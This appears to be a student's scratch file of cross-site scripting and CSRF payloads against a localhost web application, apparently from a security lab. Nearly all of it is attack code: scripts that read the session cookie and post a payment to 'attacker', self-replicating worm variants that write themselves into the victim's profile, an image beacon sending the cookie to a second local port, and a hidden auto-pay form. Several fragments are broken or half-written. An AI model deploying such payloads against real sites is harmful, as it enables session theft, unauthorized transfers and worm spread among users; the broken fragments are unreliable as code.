<script>
  var xhr = new XMLHttpRequest();
  xhr.open("POST", 'http://localhost:8080/pay', true);
  xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhr.send("recipient=attacker&amount=1&submit=Pay&session_id=" + document.cookie.split("=")[1]);
</script>



<script>
function embed(){
  var xhr = new XMLHttpRequest();
  xhr.open("POST", 'http://localhost:8080/pay', true);
  xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhr.send("recipient=attacker&amount=1&submit=Pay&session_id=" + document.cookie.split("=")[1]);
}
embed();

function infect(){
  var atk = new XMLHttpRequest();
  atk.open("POST", 'http://localhost:8080/aboutme', true);
  atk.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  atk.send("aboutme=" + decodeURIComponent('%3Cscript%3E') + "embed();" + decodeURIComponent('%3C/script%3E'));
}
infect();
</script>



<script>
function embed(){
  var xhr = new XMLHttpRequest();
  xhr.open("POST", 'http://localhost:8080/pay', true);
  xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhr.send("recipient=attacker&amount=1&submit=Pay&session_id=" + document.cookie.split("=")[1]);

  var atk = new XMLHttpRequest();
  atk.open("POST", 'http://localhost:8080/aboutme', true);
  atk.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  atk.send("aboutme=" + decodeURIComponent('%3Cscript%3E') + embed.toString() + decodeURIComponent('%3C/script%3E'));
}

embed();
alert("aboutme=" + decodeURIComponent('%3Cscript%3E') + embed.toString() + decodeURIComponent('%3C/script%3E'));
</script>

<script>
alert("aboutme=" + decodeURIComponent('%3Cscript%3E') + decodeURIComponent('%3C/script%3E'));
 </script>
function worm (){
var headers = new Headers;
headers.append('credentials', 'include');
 formData = new FormData();
 formData.append('recipient', 'attacker');
 formData.append('amount', 1);
 formData.append('csrftoken', document.cookie.split('=')[1]);
 fetch('/pay',{method: 'POST',headers,body: formData});

 var formData1 = new FormData();
 formData1.append('aboutme', decodeURIComponent('%3Cscript%3E')+worm.toString()+decodeURIComponent(';worm();%3C/script%3E'));
 fetch('http://localhost:8080/aboutme',{method:'POST',headers,body:formData1});}
  worm();
  </script>










# get url

# open url, addlistener
  var atk = new XMLHttpRequest();
  var url = document.getElementsByTagName("a")).item(0)
  atk.open("POST", url, true);
  xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhr.send("recipient=attacker&amount=1&submit=Pay&session_id=" + document.cookie.split("=")[1]);
localhost:8080/profile/
<script> var img=document.createElement('img');
img.src="http://localhost:8081/xss_out&stolen_cookie="+document.cookie.split("=")[1];
document.getElementsByClassName('error')[0].style.display='none';
</script>
# set worm into update




<script> alert((document.getElementsByTagName("a")).item(0));</script>

<script> alert(user.username)</script>


<script>
  var xhr = new XMLHttpRequest();
  xhr.open("POST", 'http://localhost:8080/pay', true);
  xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhr.send("recipient=attacker&amount=1&submit=Pay&session_id=" + document.cookie.split("=")[1]);
  var spread = new XMLHttpRequest();
  spread.open("POST", 'http://localhost:8080/aboutme', true);
  spread.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  var data = "%20%20var%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%20%20xhr.open%28%22POST%22%2C%20%27http%3A%2F%2Flocalhost%3A8080%2Fpay%27%2C%20true%29%3B%0A%20%20xhr.setRequestHeader%28%22Content-type%22%2C%20%22application%2Fx-www-form-urlencoded%22%29%3B%0A%20%20xhr.send%28%22recipient%3Dattacker%26amount%3D1%26submit%3DPay%26session_id%3D%22%20%2B%20document.cookie.split%28%22%3D%22%29%5B1%5D%29%3B";
  spread.send(data);

</script>

<script>
alert(document);
</script>

<script>







<form id="myForm">
<input name="recipient" type="hidden" value="attacker">
<input name="amount" type="hidden" value=1>
<input type="submit" value="Pay">
<input type="hidden" name="session_id" value={}.format(document.cookie.split("=")[1])>
</form>

<script>
  var xhr = new XMLHttpRequest();
  var fd = new FormData(document.getElementById("myForm"));
  xhr.open("POST", 'http://localhost:8080/pay', true);
  xhr.onreadystatechange = function(){if(xhr.readyState == 4){alert(xhr.responseText)}};
  xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhr.send(fd);
</script>


% Session['UserName']%>

<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://localhost:8080/pay', true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
xhr.send("recipient=attacker&amount=1&submit=pay");
</script>